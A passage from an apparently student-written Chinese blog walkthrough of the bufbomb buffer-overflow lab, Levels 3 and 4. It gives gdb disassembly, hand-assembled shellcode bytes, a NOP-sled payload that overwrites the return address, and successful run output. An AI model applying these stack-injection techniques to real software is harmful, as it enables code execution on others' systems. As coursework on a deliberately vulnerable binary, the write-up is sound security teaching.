class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看getbuf(),test()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x08048e3c &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048e3d &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048e3f &lt;+3&gt;:push   %ebx</span><br><span class="line">   0x08048e40 &lt;+4&gt;:sub    $0x24,%esp</span><br><span class="line">   0x08048e43 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e48 &lt;+12&gt;:mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048e4b &lt;+15&gt;:call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">   0x08048e50 &lt;+20&gt;:mov    %eax,%ebx</span><br><span class="line">   0x08048e52 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e57 &lt;+27&gt;:mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048e5a &lt;+30&gt;:cmp    %edx,%eax</span><br><span class="line">   0x08048e5c &lt;+32&gt;:je     0x8048e74 &lt;test+56&gt;</span><br><span class="line">   0x08048e5e &lt;+34&gt;:movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048e66 &lt;+42&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e6d &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e72 &lt;+54&gt;:jmp    0x8048eba &lt;test+126&gt;</span><br><span class="line">   0x08048e74 &lt;+56&gt;:cmp    0x804d104,%ebx</span><br><span class="line">   0x08048e7a &lt;+62&gt;:jne    0x8048ea2 &lt;test+102&gt;</span><br><span class="line">   0x08048e7c &lt;+64&gt;:mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048e80 &lt;+68&gt;:movl   $0x804a31a,0x4(%esp)</span><br><span class="line">   0x08048e88 &lt;+76&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e8f &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://img-blog.csdnimg.cn/0d0b08a02aa946e6a2fde0f847c1846d.png#pic_center" alt="在这里插入图片描述"></p><p>由于此题开始要求回到test()函数，并且函数的栈空间不能被破坏，也就是test() 的ebp地址被冲掉之后还得给它存回去，那么在buf缓冲区的对应位置存回test() 的esp地址即可，返回地址依然存buf缓冲区的首地址，植入攻击代码，攻击代码的内容为：修改返回值即eax的值为cookie并重新回到test() 函数</p><p>上一题已经得知buf首地址为0x55683848，接下来要知道test() esp 的值</p><p>gdb设置断点在getbuf()函数(见上面的汇编码)中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e3c &lt;+0&gt;:push   %ebp</span><br><span class="line">0x08048e3d &lt;+1&gt;:mov    %esp,%ebp</span><br></pre></td></tr></table></figure><p>0x08048e3d这个位置，此时test()的ebp地址已经被压入栈中，然后查看ebp所存的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049263</span><br><span class="line">Breakpoint 4 at 0x8049263</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x08049263 in getbuf ()</span><br><span class="line">(gdb) p/x $ebp</span><br><span class="line"><span class="meta">$</span><span class="language-bash">4 = 0x556838a0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到test()ebp地址的值为0x556838a0</p><p>接下来编写攻击代码，即将eax的值改为cookie，并且将程序返回到test()函数中，即test()函数调用getbuf()的下一条指令的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e4b &lt;+15&gt;:call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">0x08048e50 &lt;+20&gt;:mov    %eax,%ebx</span><br></pre></td></tr></table></figure><p>0x08048e50</p><p>故攻击代码编写如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  ;返回cookie值</span><br><span class="line">pushl $0x08048e50        ;返回地址指向test中的getbuf调用后一条指令</span><br><span class="line">ret                     ;返回test继续执行</span><br></pre></td></tr></table></figure><p>重复上一关的操作得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure><p>答案及结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./3.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">a0 38 68 55 //test()函数的ebp栈底地址</span><br><span class="line">48 38 68 55 //buf缓冲区首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 3.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Boom!: getbuf returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-Level4-Nitroglycerin-10-pts"><a href="#5-Level4-Nitroglycerin-10-pts" class="headerlink" title="5.Level4: Nitroglycerin (10 pts)"></a>5.Level4: Nitroglycerin (10 pts)</h1><p>For this level, we have gone theopposite direction, making the stack positions even less stable than they normallyare. Hence the name “nitroglycerin”—an explosive that is notoriouslyunstable.When you run BUFBOMB with the command line flag “-n,” it will run in“Nitro” mode. Rather than calling the function getbuf, the program calls aslightly different function getbufn:</p><p>题意解析：</p><p>最后一关的要求和上一关一致，不过需要加上-n参数运行bufbomb，此时会进入testn和getbufn函数而不是test和getbuf函数。</p><p>testn(),getbufn()源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">testn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbufn();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbufn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[KABOOM_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>与3不同的是，这关会连续执行5次，且每一次test()函数的ebp地址会改变,然后buf缓冲区的大小变成了512，buf缓冲区的首地址在每次运行的时候也各不相同</p><p>看起来好像有点棘手，但实际上总空间大小是不变的进入buf缓冲区，还是顶掉返回地址，将返回地址设置成buf缓冲区的首地址，或者，buf缓冲区中间的某一个位置(因为buf缓冲区的首地址不确定了)，然后让其一直执行，直到缓冲区末尾，然后我们将攻击代码放置在某位，这样，就算每次开始执行的位置不同，最后也都能执行到攻击代码的位置。那么怎么使程序持续执行到缓冲区末尾呢?</p><p>nop指令可以帮我们做到这一点，其编码为0x90，所以我们将缓冲区的前面很长一部分都用0x90来填充，末尾部分填充攻击代码，这样就能达到要求了</p><p>攻击代码的功能和上一关是一样的，这里就不细说了，只是有一点，testn()函数的ebp地址不再固定，所以我们只能通过esp即栈顶指针加上testn()函数的空间大小来确定ebp的地址</p><p>查看testn()和getbufn()的汇编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function testn:</span><br><span class="line">   0x08048cce &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048ccf &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048cd1 &lt;+3&gt;:push   %ebx</span><br><span class="line">   0x08048cd2 &lt;+4&gt;:sub    $0x24,%esp</span><br><span class="line">   0x08048cd5 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048cda &lt;+12&gt;:mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048cdd &lt;+15&gt;:call   0x8049244 &lt;getbufn&gt;</span><br><span class="line">   0x08048ce2 &lt;+20&gt;:mov    %eax,%ebx</span><br><span class="line">   0x08048ce4 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048ce9 &lt;+27&gt;:mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048cec &lt;+30&gt;:cmp    %edx,%eax</span><br><span class="line">   0x08048cee &lt;+32&gt;:je     0x8048d06 &lt;testn+56&gt;</span><br><span class="line">   0x08048cf0 &lt;+34&gt;:movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048cf8 &lt;+42&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048cff &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d04 &lt;+54&gt;:jmp    0x8048d4c &lt;testn+126&gt;</span><br><span class="line">   0x08048d06 &lt;+56&gt;:cmp    0x804d104,%ebx</span><br><span class="line">   0x08048d0c &lt;+62&gt;:jne    0x8048d34 &lt;testn+102&gt;</span><br><span class="line">   0x08048d0e &lt;+64&gt;:mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048d12 &lt;+68&gt;:movl   $0x804a48c,0x4(%esp)</span><br><span class="line">   0x08048d1a &lt;+76&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d21 &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function getbufn:</span><br><span class="line">   0x08049244 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049245 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049247 &lt;+3&gt;:sub    $0x218,%esp</span><br><span class="line">   0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br><span class="line">   0x08049253 &lt;+15&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08049256 &lt;+18&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x0804925b &lt;+23&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049260 &lt;+28&gt;:leave  </span><br><span class="line">   0x08049261 &lt;+29&gt;:ret   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048cce &lt;+0&gt;:push   %ebp</span><br><span class="line">0x08048ccf &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">0x08048cd1 &lt;+3&gt;:push   %ebx</span><br><span class="line">0x08048cd2 &lt;+4&gt;:sub    $0x24,%esp</span><br></pre></td></tr></table></figure><p>这个地方我是存有疑惑的，因为我觉得ebp应该是esp+24得到，但实际上是esp+28，不太明白是怎么回事，看网上其他人的博客，这里也一笔带过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br></pre></td></tr></table></figure><p>这里可以知道缓冲区有520个字节加上ebp所占空间有524个字节，最后四个字节即return地址，填写buf缓冲区的地址</p><p>先搞攻击代码，和上一关类似，就ebp地址的获取方式不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x685c1d96,%eax ;将cookie传入</span><br><span class="line">lea 0x28(%esp),%ebp;获取ebp地址</span><br><span class="line">push $0x08048ce2 ;返回到test()函数</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure><p>接下来是找最大的buf缓冲区首地址，这样即使每次buf缓冲区首地址不同也能够通过nop到达缓冲区末尾的攻击代码</p><p>断点设在0x08049253,查看eax即是buf首地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax</span><br><span class="line">0x08049253 &lt;+15&gt;:mov    %eax,(%esp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049253</span><br><span class="line">Breakpoint 1 at 0x8049253</span><br><span class="line">(gdb) r -n -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$1 = 0x55683668</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:                    </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$5 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到5个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x55683668</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">$5 = 0x55683688</span><br></pre></td></tr></table></figure><p>将最大地址0x55683698作为目标地址即可</p><h4 id="答案及结果-2"><a href="#答案及结果-2" class="headerlink" title="答案及结果"></a>答案及结果</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">./4.txt</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 //509个字节</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3 //攻击代码15个字节，共524个字节</span><br><span class="line">98 36 68 55 //buf目标地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw -n &lt; 4.txt | ./bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span 